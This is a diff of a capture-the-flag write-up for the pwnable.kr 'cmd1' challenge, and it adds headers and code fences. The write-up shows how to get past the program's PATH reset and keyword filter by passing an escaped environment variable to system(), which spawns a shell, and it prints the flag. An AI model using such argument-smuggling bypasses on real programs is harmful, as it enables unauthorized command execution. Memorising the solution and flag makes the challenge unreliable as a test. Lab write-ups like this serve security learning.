@@ -1,8 +1,17 @@
+#Objective:
+
+Mommy! what is PATH environment in Linux?
+
+ssh cmd1@pwnable.kr -p2222 (pw:guest)
+
+This is a 1 pt challenge from Pwnable.kr
+
+#Solution:
+
+
 When we ssh into the server, we see the typical c program, the code, and a flag. Let’s take a look at the C code.
 
-
-
-
+```
 #include <stdio.h>
 #include <string.h>
 
@@ -19,7 +28,7 @@ int main(int argc, char* argv[], char** envp){
     if(filter(argv[1])) return 0;
     system( argv[1] );
 }
-
+```
 
 The first thing that this code does is it resets the PATH environment variable. In linux what the PATH environment variable does is it acts as a place where the terminal will search for commands such as “ls” and “cat”. With that messed up, we will have to type out the full paths to those commands “/bin/ls” and “/bin/cat”, because it will look in the wrong directory.
 
@@ -32,32 +41,27 @@ So what we will have to do is give it a system command, that can work even with 
 
 First we can create the environment variable that we will use
 
-
-“export sl=”sh””
-
+```
+export sl=”sh”
+```
 
 Proceeding that we just need to pass it to the program. Keep in mind that we have to escape the “$sl” using a “\” otherwise it will just pass the value of the environment variable, instead of the literal string
 
-
-“./cmd1 “/bin/\$sl””
-
+```
+./cmd1 “/bin/\$sl”
+```
 
 And we have a shell
 
-
-
-
+```
 $ /bin/ls
 cmd1  cmd1.c  flag
 $ /bin/cat flag
 mommy now I get what PATH environment is for :)
-
-
-Flag: mommy now I get what PATH environment is for :)
-
+```
 
 There is another way you can do this all in one step you can just create the environment variable and pass it directly to the program.
 
-
-“sl=”sh” ./cmd1 “/bin/\$sl””
-
+```
+sl=”sh” ./cmd1 “/bin/\$sl”
+```
